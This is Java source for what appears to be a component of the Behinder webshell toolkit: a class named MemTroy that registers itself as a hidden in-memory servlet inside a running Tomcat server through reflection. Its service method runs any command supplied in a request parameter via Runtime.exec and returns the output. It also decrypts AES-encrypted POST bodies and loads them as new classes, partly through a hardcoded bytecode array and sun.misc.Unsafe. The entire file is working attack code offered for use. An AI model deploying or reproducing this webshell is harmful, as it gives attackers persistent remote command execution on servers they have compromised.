package net.rebeyond.behinder.payload.java;

import net.rebeyond.behinder.dao.ShellManager;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.StandardContext;
import sun.misc.BASE64Decoder;
import sun.misc.Unsafe;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import javax.servlet.jsp.PageContext;
import java.io.IOException;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Map;

public class MemTroy extends ClassLoader implements Servlet {
    public static String whatever;
    public static String type;
    public static String password;
    public static String path;
    private PageContext pageContext;

    public MemTroy() {
    }

    public MemTroy(ClassLoader parent) {
        super(parent);
    }

    public MemTroy(String type, String password, String path) {
        this.type = type;
        this.password = password;
        this.path = path;
    }


    public boolean equals(Object obj) {
        boolean success = false;
        PageContext page = (PageContext) obj;
        pageContext = page;
        page.getResponse().setCharacterEncoding("UTF-8");
        String filterUrlPattern = path;
        String filterName = path.replace("/", "");
        filterName = filterName.replace("\\", "");
        try {
            ServletContext servletContext = page.getServletContext();
            doEquals(filterUrlPattern, filterName, servletContext);
            success = true;
        } catch (Exception e) {
            System.out.println("register memtroy encount exception!");
        }
        doReport(page.getRequest(), page.getResponse(), success);
        try {
            page.getOut().clear();
        } catch (IOException e) {
            e.printStackTrace();
        }
        return success;
    }

    public boolean equals1(HttpServletRequest request, HttpServletResponse response) {
        boolean success = false;
        response.setCharacterEncoding("UTF-8");
        String filterUrlPattern = path;
        String filterName = path.replace("/", "");
        filterName = filterName.replace("\\", "");
        try {
            ServletContext servletContext = request.getServletContext();
            doEquals(filterUrlPattern, filterName, servletContext);
            success = true;
        } catch (Exception e) {
            System.out.println("register memtroy encount exception!");
        }
        doReport(request, response, success);
        return success;
    }

    private void doReport(ServletRequest request, ServletResponse response, boolean success) {
        try {
            HttpServletRequest localRequest = (HttpServletRequest)request;
            HashMap<String, String> result = new HashMap<String, String>();
            result.put("success", success ? "true" : "flase");
            String key = localRequest.getSession().getAttribute("u").toString();
            ServletOutputStream so = response.getOutputStream();
            so.write(Encrypt(buildJson(result, true).getBytes(), key));
            so.flush();
            so.close();
        } catch (Exception e) {

        }
    }

    private void doEquals(String filterUrlPattern, String filterName, ServletContext servletContext) throws Exception {
        //获取ApplicationContext
        Field field = servletContext.getClass().getDeclaredField("context");
        field.setAccessible(true);
        ApplicationContext applicationContext = (ApplicationContext) field.get(servletContext);
        //获取StandardContext
        field = applicationContext.getClass().getDeclaredField("context");
        field.setAccessible(true);
        StandardContext standardContext = (StandardContext) field.get(applicationContext);

        if (standardContext != null) {
            Object o = getFieldValue(standardContext.getServletContext(), "context");
            Object newWrapper = this.invoke(standardContext, "createWrapper", (Object[]) null);
            this.invoke(newWrapper, "setName", filterName);
            setFieldValue(newWrapper, "instance", this);
            Class containerClass = Class.forName("org.apache.catalina.Container", false, standardContext.getClass().getClassLoader());
            Object oldWrapper = this.invoke(standardContext, "findChild", filterName);
            if (oldWrapper != null) {
                standardContext.getClass().getDeclaredMethod("removeChild", containerClass);
            }
            standardContext.getClass().getDeclaredMethod("addChild", containerClass).invoke(standardContext, newWrapper);
            Method method;
            try {
                method = standardContext.getClass().getMethod("addServletMappingDecoded", String.class, String.class);
            } catch (Exception var9) {
                method = standardContext.getClass().getMethod("addServletMapping", String.class, String.class);
            }
            method.invoke(standardContext, filterUrlPattern, filterName);
            if (this.getMethodByClass(newWrapper.getClass(), "setServlet", Servlet.class) == null) {
                this.transform(standardContext, filterUrlPattern);
                this.init((ServletConfig) getFieldValue(newWrapper, "facade"));
            }
        }
    }


    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field f = null;
        if (obj instanceof Field) {
            f = (Field) obj;
        } else {
            f = obj.getClass().getDeclaredField(fieldName);
        }


        f.setAccessible(true);
        f.set(obj, value);
    }


    private void transform(Object standardContext, String path) throws Exception {
        Object containerBase = this.invoke(standardContext, "getParent", (Object[]) null);
        Class mapperListenerClass = Class.forName("org.apache.catalina.connector.MapperListener", false, containerBase.getClass().getClassLoader());
        Field listenersField = Class.forName("org.apache.catalina.core.ContainerBase", false, containerBase.getClass().getClassLoader()).getDeclaredField("listeners");
        listenersField.setAccessible(true);
        ArrayList listeners = (ArrayList) listenersField.get(containerBase);

        for (int i = 0; i < listeners.size(); ++i) {
            Object mapperListener_Mapper = listeners.get(i);
            if (mapperListener_Mapper != null && mapperListenerClass.isAssignableFrom(mapperListener_Mapper.getClass())) {
                Object mapperListener_Mapper2 = getFieldValue(mapperListener_Mapper, "mapper");
                Object mapperListener_Mapper_hosts = getFieldValue(mapperListener_Mapper2, "hosts");


                for (int j = 0; j < Array.getLength(mapperListener_Mapper_hosts); ++j) {
                    Object mapperListener_Mapper_host = Array.get(mapperListener_Mapper_hosts, j);
                    Object mapperListener_Mapper_hosts_contextList = getFieldValue(mapperListener_Mapper_host, "contextList");
                    Object mapperListener_Mapper_hosts_contextList_contexts = getFieldValue(mapperListener_Mapper_hosts_contextList, "contexts");


                    for (int k = 0; k < Array.getLength(mapperListener_Mapper_hosts_contextList_contexts); ++k) {
                        Object mapperListener_Mapper_hosts_contextList_context = Array.get(mapperListener_Mapper_hosts_contextList_contexts, k);
                        if (standardContext.equals(getFieldValue(mapperListener_Mapper_hosts_contextList_context, "object"))) {
                            new ArrayList();
                            Object standardContext_Mapper = this.invoke(standardContext, "getMapper", (Object[]) null);
                            Object standardContext_Mapper_Context = getFieldValue(standardContext_Mapper, "context");
                            Object standardContext_Mapper_Context_exactWrappers = getFieldValue(standardContext_Mapper_Context, "exactWrappers");
                            Object mapperListener_Mapper_hosts_contextList_context_exactWrappers = getFieldValue(mapperListener_Mapper_hosts_contextList_context, "exactWrappers");


                            int l;
                            Object Mapper_Wrapper;
                            Method addWrapperMethod;
                            for (l = 0; l < Array.getLength(mapperListener_Mapper_hosts_contextList_context_exactWrappers); ++l) {
                                Mapper_Wrapper = Array.get(mapperListener_Mapper_hosts_contextList_context_exactWrappers, l);
                                if (path.equals(getFieldValue(Mapper_Wrapper, "name"))) {
                                    addWrapperMethod = mapperListener_Mapper2.getClass().getDeclaredMethod("removeWrapper", mapperListener_Mapper_hosts_contextList_context.getClass(), String.class);
                                    addWrapperMethod.setAccessible(true);
                                    addWrapperMethod.invoke(mapperListener_Mapper2, mapperListener_Mapper_hosts_contextList_context, path);
                                }
                            }


                            for (l = 0; l < Array.getLength(standardContext_Mapper_Context_exactWrappers); ++l) {
                                Mapper_Wrapper = Array.get(standardContext_Mapper_Context_exactWrappers, l);
                                if (path.equals(getFieldValue(Mapper_Wrapper, "name"))) {
                                    addWrapperMethod = mapperListener_Mapper2.getClass().getDeclaredMethod("addWrapper", mapperListener_Mapper_hosts_contextList_context.getClass(), String.class, Object.class);
                                    addWrapperMethod.setAccessible(true);
                                    addWrapperMethod.invoke(mapperListener_Mapper2, mapperListener_Mapper_hosts_contextList_context, path, getFieldValue(Mapper_Wrapper, "object"));
                                }
                            }
                        }
                    }
                }
            }
        }
    }


    private Method getMethodByClass(Class cs, String methodName, Class... parameters) {
        Method method = null;
        while (cs != null) {
            try {
                method = cs.getDeclaredMethod(methodName, parameters);
                cs = null;
            } catch (Exception var6) {
                cs = cs.getSuperclass();
            }
        }
        return method;
    }

    private Object invoke(Object obj, String methodName, Object... parameters) {
        try {
            ArrayList classes = new ArrayList();
            if (parameters != null) {
                for (int i = 0; i < parameters.length; ++i) {
                    Object o1 = parameters[i];
                    if (o1 != null) {
                        classes.add(o1.getClass());
                    } else {
                        classes.add((Object) null);
                    }
                }
            }
            Method method = this.getMethodByClass(obj.getClass(), methodName, (Class[]) classes.toArray(new Class[0]));
            return method.invoke(obj, parameters);
        } catch (Exception var7) {
            return null;
        }
    }

    public static Object getFieldValue(Object obj, String fieldName) throws Exception {
        Field f = null;
        if (obj instanceof Field) {
            f = (Field) obj;
        } else {
            Method method = null;
            Class cs = obj.getClass();
            while (cs != null) {
                try {
                    f = cs.getDeclaredField(fieldName);
                    cs = null;
                } catch (Exception var6) {
                    cs = cs.getSuperclass();
                }
            }
        }
        f.setAccessible(true);
        return f.get(obj);
    }

    public static byte[] Encrypt(byte[] bs, String key) throws Exception {
        byte[] raw = key.getBytes("utf-8");
        SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
        Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
        cipher.init(1, skeySpec);
        byte[] encrypted = cipher.doFinal(bs);
        return encrypted;
    }

    private String buildJson(Map<String, String> entity, boolean encode) throws Exception {
        StringBuilder sb = new StringBuilder();
        String version = System.getProperty("java.version");
        sb.append("{");
        for (String key : entity.keySet()) {

            sb.append("\"" + key + "\":\"");
            String value = ((String) entity.get(key)).toString();
            if (encode) {
                if (version.compareTo("1.9") >= 0) {

                    getClass();
                    Class<?> Base64 = Class.forName("java.util.Base64");
                    Object Encoder = Base64.getMethod("getEncoder", null).invoke(Base64, null);
                    value = (String) Encoder.getClass().getMethod("encodeToString", new Class[]{byte[].class}).invoke(Encoder, new Object[]{value.getBytes("UTF-8")});
                } else {

                    getClass();
                    Class<?> Base64 = Class.forName("sun.misc.BASE64Encoder");
                    Object Encoder = Base64.newInstance();
                    value = (String) Encoder.getClass().getMethod("encode", new Class[]{byte[].class}).invoke(Encoder, new Object[]{value.getBytes("UTF-8")});

                    value = value.replace("\n", "").replace("\r", "");
                }
            }
            sb.append(value);
            sb.append("\",");
        }
        if (sb.toString().endsWith(","))
            sb.setLength(sb.length() - 1);
        sb.append("}");
        return sb.toString();
    }

    @Override
    public void init(ServletConfig servletConfig) throws ServletException {
        System.out.println("init memtroy start");
    }

    @Override
    public ServletConfig getServletConfig() {
        return null;
    }


    public Class g(byte[] b) {
        return super.defineClass(b, 0, b.length);
    }

    @Override
    public void service(ServletRequest servletRequest, ServletResponse servletResponse) {
        System.out.println("serve in memtroy!!");
        HttpServletRequest localRequest = (HttpServletRequest) servletRequest;
        HttpServletResponse localResponse = (HttpServletResponse) servletResponse;
        HttpSession localSession = localRequest.getSession();

        try {
            String i = localRequest.getParameter("i");
            if (i == null)
                throw new IllegalArgumentException("i isnull");
            java.io.InputStream in = Runtime.getRuntime().exec(i).getInputStream();
            int a = -1;
            byte[] b = new byte[2048];
            localResponse.getWriter().print("<pre>");
            while ((a = in.read(b)) != -1) {
                localResponse.getWriter().println(new String(b));
            }
            localResponse.getWriter().print("</pre>");
        } catch (Exception e) {
            System.out.println(e.getMessage());
        }

        try {
            if (localRequest.getMethod().equals("POST")) {
                System.out.println("service in post");
                String k = password;
                localSession.putValue("u", k);
                Cipher c = Cipher.getInstance("AES");
                c.init(2, new SecretKeySpec(k.getBytes(), "AES"));
                //get data
                String data = localRequest.getReader().readLine();
                //decrypt
                byte[] bytes = new BASE64Decoder().decodeBuffer(data);
                byte[] decodedBytes = c.doFinal(bytes);
                //define class
                Object excuteObj = null;
                try {
                    boolean test = false;
                    try {
                        test = null != Class.forName("net.rebeyond.behinder.core.U");
                    } catch (Throwable t) {
                        test = false;
                    }
                    if (test) {
                        Class Uclass = Class.forName("net.rebeyond.behinder.core.U");
                        Constructor tt = Uclass.getDeclaredConstructor(ClassLoader.class);
                        tt.setAccessible(true);
                        Object xx = tt.newInstance(this.getClass().getClassLoader());
                        Method tt1 = Uclass.getDeclaredMethod("g", byte[].class);
                        tt1.setAccessible(true);
                        Class evilClass = (Class) tt1.invoke(xx, decodedBytes);
                        excuteObj = evilClass.newInstance();
                    } else {
                        //这里解决了 好开心
                        byte[] Uclassbate = new byte[]{-54, -2, -70, -66, 0, 0, 0, 51, 0, 26, 10, 0, 4, 0, 20, 10, 0, 4, 0, 21, 7, 0, 22, 7, 0, 23, 1, 0, 6, 60, 105, 110, 105, 116, 62, 1, 0, 26, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 67, 108, 97, 115, 115, 76, 111, 97, 100, 101, 114, 59, 41, 86, 1, 0, 4, 67, 111, 100, 101, 1, 0, 15, 76, 105, 110, 101, 78, 117, 109, 98, 101, 114, 84, 97, 98, 108, 101, 1, 0, 18, 76, 111, 99, 97, 108, 86, 97, 114, 105, 97, 98, 108, 101, 84, 97, 98, 108, 101, 1, 0, 4, 116, 104, 105, 115, 1, 0, 30, 76, 110, 101, 116, 47, 114, 101, 98, 101, 121, 111, 110, 100, 47, 98, 101, 104, 105, 110, 100, 101, 114, 47, 99, 111, 114, 101, 47, 85, 59, 1, 0, 1, 99, 1, 0, 23, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 67, 108, 97, 115, 115, 76, 111, 97, 100, 101, 114, 59, 1, 0, 1, 103, 1, 0, 21, 40, 91, 66, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 67, 108, 97, 115, 115, 59, 1, 0, 1, 98, 1, 0, 2, 91, 66, 1, 0, 10, 83, 111, 117, 114, 99, 101, 70, 105, 108, 101, 1, 0, 6, 85, 46, 106, 97, 118, 97, 12, 0, 5, 0, 6, 12, 0, 24, 0, 25, 1, 0, 28, 110, 101, 116, 47, 114, 101, 98, 101, 121, 111, 110, 100, 47, 98, 101, 104, 105, 110, 100, 101, 114, 47, 99, 111, 114, 101, 47, 85, 1, 0, 21, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 67, 108, 97, 115, 115, 76, 111, 97, 100, 101, 114, 1, 0, 11, 100, 101, 102, 105, 110, 101, 67, 108, 97, 115, 115, 1, 0, 23, 40, 91, 66, 73, 73, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 67, 108, 97, 115, 115, 59, 0, 32, 0, 3, 0, 4, 0, 0, 0, 0, 0, 2, 0, 0, 0, 5, 0, 6, 0, 1, 0, 7, 0, 0, 0, 62, 0, 2, 0, 2, 0, 0, 0, 6, 42, 43, -73, 0, 1, -79, 0, 0, 0, 2, 0, 8, 0, 0, 0, 10, 0, 2, 0, 0, 0, 5, 0, 5, 0, 6, 0, 9, 0, 0, 0, 22, 0, 2, 0, 0, 0, 6, 0, 10, 0, 11, 0, 0, 0, 0, 0, 6, 0, 12, 0, 13, 0, 1, 0, 1, 0, 14, 0, 15, 0, 1, 0, 7, 0, 0, 0, 61, 0, 4, 0, 2, 0, 0, 0, 9, 42, 43, 3, 43, -66, -73, 0, 2, -80, 0, 0, 0, 2, 0, 8, 0, 0, 0, 6, 0, 1, 0, 0, 0, 8, 0, 9, 0, 0, 0, 22, 0, 2, 0, 0, 0, 9, 0, 10, 0, 11, 0, 0, 0, 0, 0, 9, 0, 16, 0, 17, 0, 1, 0, 1, 0, 18, 0, 0, 0, 2, 0, 19};
                        Field field = Unsafe.class.getDeclaredField("theUnsafe");
                        field.setAccessible(true);
                        Unsafe unsafe = (Unsafe) field.get(Unsafe.class);
                        Class Uclass = unsafe.defineClass("net.rebeyond.behinder.core.U", Uclassbate, 0, Uclassbate.length, null, null);
                        Constructor tt = Uclass.getDeclaredConstructor(ClassLoader.class);
                        tt.setAccessible(true);
                        Object xx = tt.newInstance(this.getClass().getClassLoader());
                        Method Um = Uclass.getDeclaredMethod("g", byte[].class);
                        Um.setAccessible(true);
                        Class evilclass = (Class) Um.invoke(xx, decodedBytes);
                        excuteObj = evilclass.newInstance();
                        return;
                    }
                } catch (Exception e) {
                    e.printStackTrace();//实际中这里注释掉 调试用
                }

                //execute
                Method equals1 = excuteObj.getClass().getMethod("equals1", new Class[]{HttpServletRequest.class, HttpServletResponse.class});
                equals1.invoke(excuteObj, localRequest, localResponse);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }


    @Override
    public String getServletInfo() {
        return "memtroy";
    }

    @Override
    public void destroy() {

    }
}
